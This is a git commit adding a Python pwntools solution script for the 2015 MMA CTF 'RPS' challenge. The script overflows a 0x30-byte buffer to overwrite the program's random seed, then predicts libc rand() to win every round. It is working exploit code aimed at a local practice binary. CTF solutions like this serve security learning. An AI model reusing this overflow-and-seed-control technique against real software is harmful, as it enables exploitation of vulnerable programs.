67f433c09a757f5394a495c8785c7350f835b217
hackability <ktb88@korea.ac.kr>
2017-08-18 21:11:08 -0700

    [add] pwn/2015_MMA_RPS

---
+++ pwnable/0021_2015_MMA_RPS/sol_rsp.py
@@ -0,0 +1,28 @@
+from pwn import *
+from ctypes import *
+
+target = "./rps"
+
+p = process(target)
+
+libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
+libc.srand(0x42424242)
+
+print p.recv()
+
+payload = "A" * 0x30
+payload += "\x42\x42\x42\x42"
+
+p.sendline(payload)
+print p.recv()
+
+RPS = ['R', 'P', 'S']
+
+for i in xrange(50):
+	ans = RPS[((libc.rand() % 3)+1)%3]
+	print ans
+	p.sendline(ans)
+	print p.recv()
+
+print p.recv()
+
